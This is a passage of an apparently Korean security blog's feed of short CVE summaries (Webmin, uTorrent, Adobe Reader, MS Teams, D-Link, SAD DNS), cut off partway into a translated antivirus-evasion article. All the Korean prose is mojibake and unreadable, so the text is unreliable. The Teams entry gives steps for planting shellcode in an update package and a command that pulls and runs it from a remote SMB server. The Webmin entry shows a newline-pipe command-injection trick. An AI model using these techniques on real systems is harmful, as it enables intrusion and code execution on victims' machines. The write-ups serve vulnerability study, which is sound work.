ë’¤ì— <code>%7c</code> ë“±ìœ¼ë¡œ pipeë‚˜ <code>.</code>ì„ ì¶”ê°€í•˜ë©´ ê·¸ ë¶€ë¶„ì— <code>\</code> ë°± ìŠ¬ë˜ì‹œê°€ ì¶”ê°€ë˜ì–´ ëª…ë ¹ ì‹¤í–‰ì´ ë¶ˆê°€ëŠ¥í•˜ì§€ë§Œ <code>%0a%7c</code> ë“±ìœ¼ë¡œ ìƒˆë¡œìš´ command lineì—ì„œ ì‹¤í–‰í•˜ë©´ <code>\</code>ê°€ ë¬´ì‹œë˜ê³  ì •ìƒì ìœ¼ë¡œ arbitrary command executionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p><a href="https://pentest.com.tr/blog/webmin_pu_escape_bypass_rce.rb">í•´ë‹¹ ì·¨ì•½ì ì— ëŒ€í•œ Metasploit code</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>command execution</tag>
      
      <tag>cve-2019-12840</tag>
      
      <tag>webmin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-8437: uTorrent vulnerability, misparse to RCE</title>
    <link href="/2020/12/19/fabu1ous/2020-12-19/"/>
    <url>/2020/12/19/fabu1ous/2020-12-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.whtaguy.com/2020/09/utorrent-cve-2020-8437-vulnerability.html">CVE-2020-8437 Vulnerability And Exploit Overview</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>uTorrent &lt;= 3.5.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-8437ì€ uTorrentì˜ peerë¼ë¦¬ ì£¼ê³ ë°›ëŠ” BitTorrent protocolì—ì„œ ë°œê²¬ëœ ì·¨ì•½ì ì…ë‹ˆë‹¤. BitTorrent protocolì„ ì‹œì‘í•˜ëŠ” Handshake í˜í‚·ì—ëŠ” bencoded dictionaryë¥¼ ë‹´ê³  ìˆëŠ” <code>M field</code>ê°€ ì¡´ì¬í•©ë‹ˆë‹¤.</p><p>bencoded dictionaryëŠ” python dictionaryì™€ ë§¤ìš° ìœ ì‚¬í•˜ë©° Keyì™€ Valueë¥¼ ê°–ìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ ì¤‘ìš”í•œ ì ì€ nested(ì¤‘ì²©ëœ) dictionaryì˜ ì¡´ì¬ì¸ë°, ì¦‰ Valueê°€ ë˜ ë‹¤ë¥¸ í•˜ë‚˜ì˜ dictionaryê°€ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¤‘ì²©ëœ dictionaryë¥¼ íŒŒì‹±í•˜ëŠ” ê³¼ì •ì—ì„œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><pre><code class="hljs Bencoded">d4:keyA 6:valueA4:keyBd5:apple 3:pie6:orange 5:juiceee</code></pre><p>ì¶©ì ‘ëœ dictionaryë¥¼ íŒŒì‹± í•  ë•Œ ëª‡ ë²ˆì§¸ layerì—ì„œ íŒŒì‹±í•˜ê³  ìˆëŠ”ì§€ë¥¼ 32bit í¬ê¸°ì˜ <code>bit field</code>ì— ê¸°ë¡í•©ë‹ˆë‹¤. layerë¥¼ í•˜ë‚˜ ë“¤ì–´ê°ˆ ë•Œë§ˆë‹¤ ì´ bit fieldì— í•œ ë¹„íŠ¸ì”© í”Œë˜ê·¸ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤( ex. 2ë²ˆì§¸ layer íŒŒì‹± ì¤‘ : 0000 0000 0000 0011 ). ë§Œì•½ layerê°€ 32ë³´ë‹¤ ë§ì´ ì¤‘ì²©ëœ dictionaryë¥¼ íŒŒì‹±í•˜ê²Œ ëœë‹¤ë©´ Crashê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><p>malicious bencoded dictionaryë¥¼ ë‹´ì€ <code>.torrent</code>ë¥¼ ë°›ëŠ” peerì˜ uTorrentëŠ” nested dictionaryë¥¼ íŒŒì‹±í•˜ëŠ” ê³¼ì •ì—ì„œ Crashê°€ ë°œìƒí•˜ê³  RCEê¹Œì§€ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>utorrent</tag>
      
      <tag>misparse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Adobe Reader UAF vulnerability</title>
    <link href="/2020/12/18/l0ch/2020-12-18/"/>
    <url>/2020/12/18/l0ch/2020-12-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-9715-exploiting-a-use-after-free-in-adobe-reader">CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Adobe Reader </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Adobe Readerì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ê¹Œì§€ ê°€ëŠ¥í•œ UAF ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><code>ESObjects</code> ëŠ” Adobe Readerì˜ <code>EScript</code> ê°ì²´ì…ë‹ˆë‹¤. <code>ESObjects</code>ë¥¼ êµ¬ì„±í•  ë•Œ í•´ë‹¹ ê°ì²´ì— ëŒ€í•œ í¬ì¸í„°ê°€ ìºì‹œì— ì €ì¥ë©ë‹ˆë‹¤. ë™ì¼í•œ PDDocêµ¬ì¡°, ì´ë¦„ì„ ê°€ì§„ <code>ESObject</code>ë¥¼ êµ¬ì„±í•  ë•Œ ìƒˆë¡œ í• ë‹¹í•˜ëŠ” ëŒ€ì‹  ìºì‹œì˜ <code>ESObject</code> í¬ì¸í„°ê°€ ì‚¬ìš©ë˜ëŠ”ë°, ì´ë•Œ UAF ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><p><code>ESObject</code>ê°€ í• ë‹¹ë˜ê³  ê°ì²´ ìºì‹œì— ì¶”ê°€ë  ë•Œ <code>ESString type</code>ì€ ANSIì…ë‹ˆë‹¤. ê°ì²´ ìºì‹œì—ì„œ <code>ESObject</code>ë¥¼ ì‚­ì œí•  ë•Œ <code>ESString</code> ê°’ìœ¼ë¡œ ì°¾ì•„ ì‚­ì œí•˜ëŠ”ë°, ì‚­ì œí•  í•­ëª©ì„ ê²€ìƒ‰í•  ë•Œ  UNICODEë¡œ ì…ë ¥ë°›ì•„ <code>ESString</code> í•­ëª©ì„ ì°¾ì§€ ëª»í•˜ê²Œ ë©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ <code>ESObject</code> í¬ì¸í„°ëŠ” ì‚­ì œë˜ì§€ ì•Šê³ , ì´ë¥¼ ì¬ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ ArrayBuffer byteLength corruptionê³¼ heap sprayë¡œ íŠ¸ë¦¬ê±°í•´ RCEê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>javascript</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
      <tag>adobe reader</tag>
      
      <tag>heap spray</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Microsoft Teams Updater Living off the Land</title>
    <link href="/2020/12/17/idioth/2020-12-17/"/>
    <url>/2020/12/17/idioth/2020-12-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/">Microsoft Teams Updater Living off the Land</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MS Teams Updater</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Teamsì˜ ì—…ë°ì´íŠ¸ í”„ë¡œê·¸ë¨ì„ lolbas(Living off the land binary and script)ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì „ì— ì¡´ì¬í•˜ë˜ code executionì— ëŒ€í•œ ì·¨ì•½ì  ìˆ˜ì •ì€ URLì„ í†µí•˜ì—¬ ì—…ë°ì´íŠ¸ ê¸°ëŠ¥ì„ ì œí•œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. í•˜ì§€ë§Œ ì—…ë°ì´íŠ¸ í”„ë¡œê·¸ë¨ì€ ì œí’ˆ ì—…ë°ì´íŠ¸ë¥¼ ìœ„í•´ ê³µìœ /ë¡œì»¬ í´ë”ë¥¼ í†µí•œ ë¡œì»¬ ì—°ê²°ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì›ê²© SMB ê³µìœ  í´ë”ë¥¼ í†µí•´ í•´ë‹¹ íŒ¨ì¹˜ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ payloadë¥¼ ì‘ì„±í•˜ëŠ” ë‹¨ê³„ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><p><code>%localappdata%\Microsoft\Teams\packages</code>ì—ì„œ Microsoft Teams pre-built packageë¥¼ í†µí•´ nupkg íŒ¨í‚¤ì§€ ì¶”ì¶œ(ex. Teams-1.3.00.27559-full.nupkg)</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg\lib\net45</code>ì— shellcodeë¥¼ <code>squirrel.exe</code> íŒŒì¼ë¡œ ë„£ì€ í›„ ì••ì¶•</p></li><li><p>metadata ê³„ì‚°</p><p><code>sha1sum Teams-1.3.00.27559-full.nupkg.nupkg &amp;&amp; wc -c &lt; Teams-1.3.00.27559-full.nupkg</code></p><p>output:</p><p><code>fa8b87f0b995498a6e890c832dcaf968997608d4 Teams-1.3.00.27559-full.nupkg 4695</code></p></li><li><p><code>RELEASES</code> íŒŒì¼ì„ ìƒì„±í•œ í›„ ìœ„ì˜ ê²°ê³¼ ê°’ì„ ë³µì‚¬í•´ì„œ ì €ì¥</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg</code>ì™€ <code>RELEASES</code> íŒŒì¼ì„ ë©”ì¸ ë””ë ‰í„°ë¦¬ì— ë„£ê³  ì›ê²© SMB ì„œë²„ì— ì—…ë¡œë“œ</p></li></ol><p>í”¼í•´ìê°€ ì•„ë˜ ëª…ë ¹ì–´ë¥¼ í†µí•´ í•´ì»¤ì˜ ì›ê²© SMB ì„œë²„ë¡œ updateë¥¼ ì§„í–‰í•˜ë©´ Microsoft Teamsì— ì˜í•´ ë‹¤ìš´ë¡œë“œë˜ê³  ì‹¤í–‰ë©ë‹ˆë‹¤.</p><pre><code class="hljs taggerscript"><span class="hljs-variable">%localappdata%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\T</span>eams<span class="hljs-symbol">\u</span>pdate.exe --update = <span class="hljs-symbol">\\</span> remoteserver<span class="hljs-symbol">\p</span>ayloadFolder</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>teams</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Qualcomm DSP Achilles</title>
    <link href="/2020/12/16/fabu1ous/2020-12-16/"/>
    <url>/2020/12/16/fabu1ous/2020-12-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.checkpoint.com/2020/08/06/achilles-small-chip-big-peril/#:~:text=One%20of%20the%20most%20common,the%20leading%20manufacturers%3A%20Qualcomm%20Technologies">Qualcomm DSP Achilles</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Qualcomm DSP chip</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CheckpointëŠ” ì˜¬í•´ Defconì—ì„œ Achillesë¼ëŠ” ì—°êµ¬ ë…¼ë¬¸ì„ ë°œí‘œí–ˆìŠµë‹ˆë‹¤. AchillesëŠ” Qualcomm DSP( Digital Signal Processor ) ì¹©ì—ì„œ 400ê°œ ì´ìƒì˜ ì·¨ì•½ì ì„ ì°¾ì€ í¼ì§• ê¸°ìˆ  ì—°êµ¬ì…ë‹ˆë‹¤. Qualcommì€ ë‹¤ì–‘í•œ ì¹©ë“¤ì„ ìƒì‚°í•˜ëŠ” íšŒì‚¬ë¡œ, ìŠ¤ë§ˆíŠ¸í° ì‹œì¥ì˜ 40%ê°€ Qualcommì˜ ì¹©ì„ ì‚¬ìš©í•˜ê³  ìˆê¸° ë•Œë¬¸ì— Achillesì— ì£¼ëª©í•´ë³¼ í•„ìš”ê°€ ìˆìŠµë‹ˆë‹¤.</p><p>DSP ì¹©ë“¤ì€ ê¸°ë³¸ì ìœ¼ë¡œ Black boxë¡œ ê´€ë¦¬ë˜ê¸° ë•Œë¬¸ì—, manufacturerê°€ ì•„ë‹ˆë¼ë©´ DSP ì¹©ì— ëŒ€í•œ ì •ë³´ê°€ ì œí•œì ì¼ ìˆ˜ë°–ì— ì—†ìŠµë‹ˆë‹¤. ì´ ì¹©ì„ ì‚¬ìš©í•´ ìŠ¤ë§ˆíŠ¸í°ì„ ë§Œë“œëŠ” ì œì¡°ì‚¬ë„ ì˜ˆì™¸ëŠ” ì•„ë‹™ë‹ˆë‹¤. CheckpointëŠ” black box ë•Œë¬¸ì— ìŠ¤ë§ˆíŠ¸í° ì œì¡°ì‚¬ë“¤ì´ ì‹ ì†í•˜ê²Œ ì´ìŠˆë¥¼ ê³ ì¹˜ì§€ ëª»í•˜ëŠ” ìƒí™©ì„ ì§€ì í–ˆìŠµë‹ˆë‹¤.</p><p>ì˜¬í•´ 5ì›” Zerodiumì´ ios exploitì˜ ì œë³´ê°€ ë„ˆë¬´ ë§ë‹¤ëŠ” ì´ìœ ë¡œ êµ¬ë§¤ ì¤‘ì§€ë¥¼ ì„ ì–¸í–ˆìŠµë‹ˆë‹¤. Open sourceì¸ Android ë³´ë‹¤ ì·¨ì•½ì  ì œë³´ ê±´ìˆ˜ê°€ ë§ë‹¤ëŠ” ê²ƒì„ ê·¼ê±°ë¡œ Closed source(black box)ë¥¼ ìœ ì§€í•˜ë˜ iosì˜ ë³´ì•ˆì„±ì€ ë” ì´ìƒ íš¨ê³¼ ì—†ë‹¤ëŠ” ì˜ê²¬ì´ ìˆìŠµë‹ˆë‹¤. ios ë¿ë§Œ ì•„ë‹ˆë¼ ëª¨ë“  black boxì˜ ì˜ë¯¸ê°€ ì ì  í¬ë¯¸í•´ì§€ê³  ìˆëŠ” ê±° ê°™ìŠµë‹ˆë‹¤.</p><p>í—¤ì»¤ë“¤ì—ê² black boxì˜ ì •ë³´ íì‡„ íš¨ê³¼ëŠ” ì ì  ì˜…ì–´ì§€ê³ , vendor ì…ì¥ì—ì„  ì´ìŠˆë¥¼ ê³ ì¹˜ì§€ í˜ë“  ìƒí™©ì´ ë§ë¬¼ë ¤ Achilles ì—°êµ¬ì²˜ëŸ¼ ì·¨ì•½ì ì´ ë­‰í……ì´ë¡œ ë‚˜ì˜¤ëŠ” ì¼ì´ ë°œìƒí–ˆë‹¤ê³  ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>qualcomm</tag>
      
      <tag>dsp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-8863/8864 D-LINK ROUTER AUTHENTICATION BYPASSES</title>
    <link href="/2020/12/15/l0ch/2020-12-15/"/>
    <url>/2020/12/15/l0ch/2020-12-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses">THE ANATOMY OF A BUG DOOR: DISSECTING TWO D-LINK ROUTER AUTHENTICATION BYPASSES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>D-LINK router</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>HNAP (Home Network Administration Protocol)ëŠ” Pure Networks Inc. ì—ì„œ ê°œë°œ í•œ ë…ì  SOAP ê¸°ë°˜ í”„ë¡œí† ì½œì…ë‹ˆë‹¤. í˜„ì¬ëŠ” ì´ í”„ë¡œí† ì½œì˜ ì‚¬ìš©ì´ ì¤‘ë‹¨ë˜ì—ˆì§€ë§Œ ì—¬ì „íˆ ì—…ë°ì´íŠ¸ë˜ì§€ ì•Šì€ ë§ì€ ë¼ìš°í„°ë“¤ì´ í•´ë‹¹ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><p>HNAPì—ì„œ ë°œê²¬ëœ ë‘ ê°€ì§€ ì·¨ì•½ì ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p>CVE-2020-8863ì€ <code>LoginPassword</code> ê²€ì¦ ê³¼ì •ì—ì„œ ë°œìƒí•˜ëŠ” authentication bypass ì·¨ì•½ì ì…ë‹ˆë‹¤. <code>strncmp()</code> ì—ì„œ db íŒ¨ìŠ¤ì›Œë“œì™€ í´ë¼ì´ì–¸íŠ¸ê°€ ì…ë ¥í•œ <code>LoginPassword</code>ë¥¼ <code>LoginPassword</code>ì˜ size ë§Œí¼ ë¹„êµí•˜ëŠ”ë°, ì´ë•Œ <code>LoginPassword</code>ì— ë¹ˆ ê°’ì„ ì „ë‹¬í•˜ë©´ ë¹„êµí•  sizeê°€ 0ì´ ë˜ì–´ ë¬´ì¡°ê±´ ì¸ì¦ì— ì„±ê³µí•˜ê²Œ ë©ë‹ˆë‹¤.</p><p>CVE-2020-8864ëŠ” HNAP PrivateLogin ì¸ì¦ ì•Œê³ ë¦¬ì¦˜ì˜ ì˜ëª»ëœ êµ¬í˜„ìœ¼ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” authentication bypass ì·¨ì•½ì ì…ë‹ˆë‹¤. HNAPë¥¼ í†µí•´ ì¸ì¦í•  ë•Œ ì„œë²„ëŠ” ì¼ë°˜ì ìœ¼ë¡œ Private keyë¥¼ ì‚¬ìš©ìì˜ ì•”í˜¸ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ìƒì„±í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë¡œê·¸ì¸ ìš”ì²­ ì¤‘ <code>PrivateLogin</code> í•„ë“œì— â€œUsernameâ€ ê°’ì„ ë„£ì–´ ìš”ì²­í•˜ë©´ â€œUsernameâ€ê°’ìœ¼ë¡œ Private keyë¥¼ ìƒì„±í•´  ì‹¤ì œ ê´€ë¦¬ì ì•”í˜¸ë¥¼ ëª°ë¼ë„ ì¸ì¦ ì±Œë¦°ì§€ ê°’ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>authentication bypass</tag>
      
      <tag>L0ch</tag>
      
      <tag>router</tag>
      
      <tag>bug-door</tag>
      
      <tag>d-link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Windows Server DNS Resolver Spoofing ì·¨ì•½ì  ê¶Œê³ </title>
    <link href="/2020/12/14/idioth/2020-12-14/"/>
    <url>/2020/12/14/idioth/2020-12-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://dirteam.com/sander/2020/12/10/dns-spoofing-vulnerability-sad-dns-important-cve-2020-25705-adv200013/">Spoofing Vulnerability in DNS Resolver (SAD DNS, Important, CVE-2020-25705, ADV200013)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server, version 1903</li><li>Windows Server, version 1909</li><li>Windows Server, version 2004</li><li>Windows Server, version 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020ë…„ 12ì›” 8ì¼ì— ë§ˆì´í¬ë¡œì†Œí”„íŠ¸ì—ì„œ DNS Resolver addressing spoofing ì·¨ì•½ì ì— ëŒ€í•œ ë³´ì•ˆ ê³µì§€(<a href="https://msrc.microsoft.com/update-guide/vulnerability/ADV200013">ADV200013</a>)ê°€ ë°œí‘œëìŠµë‹ˆë‹¤. ë§ˆì´í¬ë¡œì†Œí”„íŠ¸ëŠ” í•´ë‹¹ ì·¨ì•½ì ì„ í†µí•œ DNS cache poisoning attackì„ ë§‰ê¸° ìœ„í•´ DNS UDP íŒ¨í‚·ì˜ í¬ê¸°ë¥¼ ì œí•œí•˜ëŠ” ê¶Œê³ ë¥¼ í–ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ Windows TCP/IP stackì— ì œê³µë˜ëŠ” DNS Resolver Componentì— ì¡´ì¬í•©ë‹ˆë‹¤. DNS Resolverì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” IP ì¡°ê°í™”ì— ì˜í•´ DNS cache poisoning ì·¨ì•½ì ì´ ë°œìƒí•˜ë©° í•´ë‹¹ ì·¨ì•½ì ì„ exploit í•œ í•´ì»¤ëŠ” DNS forwarderë‚˜ DNS Resolverì— ì˜í•´ cache ëœ DNS packetì„ ìŠ¤í‘¸í•‘ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½ì ì„ ì„±ê³µì ìœ¼ë¡œ exploit í•˜ë©´ í•´ì»¤ëŠ” ìˆ˜ì •ëœ DNS recordë¥¼ ì‚¬ìš©í•˜ì—¬ í•´ì»¤ì˜ ì›¹ì‚¬ì´íŠ¸ë¡œ redirect ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ <code>MaximumUdpPacketSize</code> ë ˆì§€ìŠ¤íŠ¸ë¦¬ ê°’ì„ 1,221 bytesë¡œ ìˆ˜ì •í•´ì•¼ í•©ë‹ˆë‹¤. ìˆ˜ì •ëœ í›„ DNS ResolverëŠ” 1,221 bytesë³´ë‹¤ í° ëª¨ë“  responseë¥¼ TCPë¡œ ë°›ì•„ì„œ Windows Server ê¸°ë°˜ DNS serverì—ì„œ í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë ¤ëŠ” ì‹œë„ë¥¼ ë§‰ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>DNS serverê°€ ì‹¤í–‰ë˜ëŠ” ëª¨ë“  Windows Serverì—ì„œ ê´€ë¦¬ì ê¶Œí•œ íŒŒì›Œ ì‰˜ì´ë‚˜ ì›ê²© ì„¸ì…˜ì„ í†µí•œ ì•„ë˜ì˜ ëª…ë ¹ì¤„ì„ ì‹¤í–‰í•˜ë©´ UDP íŒ¨í‚· í¬ê¸°ì˜ ë ˆì§€ìŠ¤íŠ¸ë¦¬ ê°’ì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-variable">$RegPath</span> = <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Services\DNS\Parameters&quot;</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$RegPath</span> <span class="hljs-literal">-Name</span> MaximumUdpPacketSize `<span class="hljs-literal">-Value</span> <span class="hljs-number">1221</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span><span class="hljs-built_in">Restart-Service</span> DNS</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows server</tag>
      
      <tag>idioth</tag>
      
      <tag>sad dns</tag>
      
      <tag>dns cache poisoning</tag>
      
      <tag>dns resolver</tag>
      
      <tag>adv200013</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.2</title>
    <link href="/2020/12/13/idioth/av_evasion_part2/"/>
    <url>/2020/12/13/idioth/av_evasion_part2/</url>
    
    <content type="html"><![CDATA[<p>ì €ë²ˆì— ì˜¬ë ¸ë˜ Engineering Antivirus evasionë¥¼ ì´ì–´ì„œ Part 2ì˜ ë²ˆì—­ë³¸ë„ ë“¤ê³  ì™”ìŠµë‹ˆë‹¤.</p><p>ì €ë²ˆì˜ ë°œ ë²ˆì—­ì— ì´ì–´ì„œ ì´ë²ˆì—ë„ ì˜ì—­ê³¼ ì˜¤ì—­ì´ ë‚œë¬´í•˜ëŠ” ê¸€ì´ë¯€ë¡œ ê¸€ì´ ì´í•´ê°€ ì•ˆ ë˜ì‹œê±°ë‚˜ ì–˜ê°€ ì™œ ì´ë ‡ê²Œ ì¼ëŠ”ì§€ ì´í•´ê°€ ì•ˆ ë˜ì‹œëŠ” ë¶€ë¶„ì´ ìˆìœ¼ì‹œë©´ ë°”ë¡œ ì§€ì í•´ì£¼ì‹œê¸° ë°”ëë‹ˆë‹¤!</p><blockquote><p>ì›ë¬¸ê¸€ : <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">Engineering antivirus evasion (Part II)</a></p></blockquote><p><strong>tl;dr</strong> ì†Œí”„íŠ¸ì›¨ì–´ëŠ” Windows ìš´ì˜ ì²´ì œì™€ ìƒí˜¸ ì‘ìš©í•˜ê¸° ìœ„í•´ ë™ì  ë§í¬ ë¼ì´ë¸ŒëŸ¬ë¦¬(DLL)ë¥¼ í†µí•´ í•¨ìˆ˜ë¥¼ ê°€ì ¸ì˜¨ë‹¤. ì´ í•¨ìˆ˜ë“¤ì€ Import Address Table í…Œì´ë¸”ì— í‰ë¬¸ìœ¼ë¡œ ì‘ì„±ë˜ê³  ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ ì†Œí”„íŠ¸ì›¨ì–´ëŠ” ì´ë¥¼ í™œìš©í•˜ì—¬ ì•…ì˜ì ì¸ í™œë™ì„ íƒì§€í•œë‹¤. ìš°ë¦¬ëŠ” Meterpreterë¥¼ ì¤‘ì‹¬ìœ¼ë¡œ C/C++ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ refactoring í•˜ì—¬ ì´ëŸ¬í•œ footprintë¥¼ ì œê±°í•  ìˆ˜ ìˆëŠ” ë‚œë…í™” ì•„ì´ë””ì–´ì™€ êµ¬í˜„ì„ ë³´ì—¬ì¤€ë‹¤. ì†ŒìŠ¤ ì½”ë“œëŠ” <a href="https://github.com/scrt/avcleaner">https://github.com/scrt/avcleaner</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><h2 id="ì†Œê°œ"><a href="#ì†Œê°œ" class="headerlink" title="ì†Œê°œ"></a>ì†Œê°œ</h2><p>ì´ì „ ê¸€ì—ì„œ ì •ê·œì‹ì„ ì‚¬ìš©í•˜ì§€ ì•Šê³  ì†ŒìŠ¤ ì½”ë“œì—ì„œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ë°”ê¾¸ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤¬ë‹¤. ë°”ì´ë„ˆë¦¬ì˜ footprintë¥¼ ì¤„ì´ê³  ì •ì  ì‹œê·¸ë‹ˆì²˜ì— ì˜ì¡´í•˜ëŠ” ë³´ì•ˆ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ìš°íšŒí•˜ëŠ” ê²ƒì´ ëª©ì ì´ë‹¤.</p><p>ê·¸ëŸ¬ë‚˜ ì†ŒìŠ¤ ì½”ë“œì˜ ë¬¸ìì—´ ë¦¬í„°ëŸ´ ë§ê³ ë„ ì •ì ìœ¼ë¡œ ìˆ˜ì§‘í•˜ê³  ë¶„ì„í•  ìˆ˜ ìˆëŠ” ì •ë³´ë“¤ì´ ë§ë‹¤. ì´ ê¸€ì€ ë°”ì´ë„ˆë¦¬ì—ì„œ API importë¥¼ ìˆ¨ê¸°ëŠ” ë°©ë²•ê³¼ C/C++ë¡œ ì‘ì„±ëœ ëª¨ë“  ì†Œí”„íŠ¸ì›¨ì–´ì—ì„œ ê·¸ ì‘ì—…ì„ ìë™í™”í•˜ëŠ” ë°©ë²•ì— 